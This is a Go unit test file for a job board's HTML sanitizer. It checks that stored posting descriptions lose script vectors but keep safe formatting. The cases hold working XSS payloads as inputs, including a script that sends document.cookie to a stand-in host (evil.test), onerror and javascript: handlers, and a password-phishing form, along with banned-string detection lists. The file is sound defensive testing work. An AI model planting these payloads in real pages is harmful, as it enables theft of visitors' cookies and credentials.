package opportunity

import (
	"strings"
	"testing"
)

// TestSanitizeRemovesEveryScriptVector.
//
// The stored description is the board's own bytes, and a job board is a surface
// anyone can post to. Each case below is a way to get script to run that a naive
// tag blocklist misses.
func TestSanitizeRemovesEveryScriptVector(t *testing.T) {
	cases := []struct {
		name string
		in   string
		// banned must not appear anywhere in the output, case-insensitively.
		banned []string
	}{
		{
			name:   "script element",
			in:     `<p>Real text</p><script>fetch('https://evil.test?c='+document.cookie)</script>`,
			banned: []string{"script", "evil.test", "document.cookie"},
		},
		{
			name:   "inline event handler",
			in:     `<div onmouseover="alert(1)">Hover</div>`,
			banned: []string{"onmouseover", "alert"},
		},
		{
			name:   "img onerror, the classic",
			in:     `<img src=x onerror="alert(1)">`,
			banned: []string{"onerror", "alert", "<img"},
		},
		{
			name:   "javascript: url",
			in:     `<a href="javascript:alert(1)">Apply</a>`,
			banned: []string{"javascript:", "alert"},
		},
		{
			name:   "data: url",
			in:     `<a href="data:text/html;base64,PHNjcmlwdD4=">Apply</a>`,
			banned: []string{"data:text/html"},
		},
		{
			name:   "iframe",
			in:     `<iframe src="https://evil.test"></iframe>`,
			banned: []string{"iframe", "evil.test"},
		},
		{
			name:   "style element and attribute",
			in:     `<style>body{display:none}</style><p style="position:fixed;inset:0">x</p>`,
			banned: []string{"<style", "position:fixed", "display:none"},
		},
		{
			name:   "form that phishes",
			in:     `<form action="https://evil.test"><input name="password"></form>`,
			banned: []string{"<form", "<input", "evil.test"},
		},
		{
			name:   "svg with a handler",
			in:     `<svg><animate onbegin="alert(1)" /></svg>`,
			banned: []string{"<svg", "onbegin", "alert"},
		},
		{
			name:   "object and embed",
			in:     `<object data="x"></object><embed src="y">`,
			banned: []string{"<object", "<embed"},
		},
	}

	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			out := *SanitizeDescription(&c.in)
			low := strings.ToLower(out)
			for _, b := range c.banned {
				if strings.Contains(low, strings.ToLower(b)) {
					t.Errorf("sanitized output still contains %q\ninput:  %s\noutput: %s",
						b, c.in, out)
				}
			}
		})
	}
}

// TestSanitizeKeepsWhatAPostingNeeds.
//
// A sanitizer that strips the formatting is not usable: the reader gets one wall
// of text and the feature is worse than not having it. This is the other half of
// the contract.
func TestSanitizeKeepsWhatAPostingNeeds(t *testing.T) {
	in := `<div><h2>About the role</h2><p>We need a <strong>backend engineer</strong>.</p>` +
		`<ul><li>Go</li><li>PostgreSQL</li></ul>` +
		`<p><a href="https://example.test/apply">Apply here</a></p></div>`
	out := *SanitizeDescription(&in)

	for _, want := range []string{
		"About the role", "<strong>", "backend engineer", "<ul>", "<li>",
		"PostgreSQL", `href="https://example.test/apply"`,
	} {
		if !strings.Contains(out, want) {
			t.Errorf("sanitized output lost %q\noutput: %s", want, out)
		}
	}
	// An off-site link must not hand the opener to the destination.
	if !strings.Contains(out, "noopener") && strings.Contains(out, "_blank") {
		t.Error("a target=_blank link was emitted without noopener")
	}
	if !strings.Contains(out, "rel=") {
		t.Error("external links carry no rel attribute")
	}
}

// TestSanitizeNilStaysNil: a posting with no body is a real state, and turning
// it into an empty string would make "no description" indistinguishable from
// "a description that sanitized to nothing".
func TestSanitizeNilStaysNil(t *testing.T) {
	if SanitizeDescription(nil) != nil {
		t.Error("nil description became non-nil")
	}
}
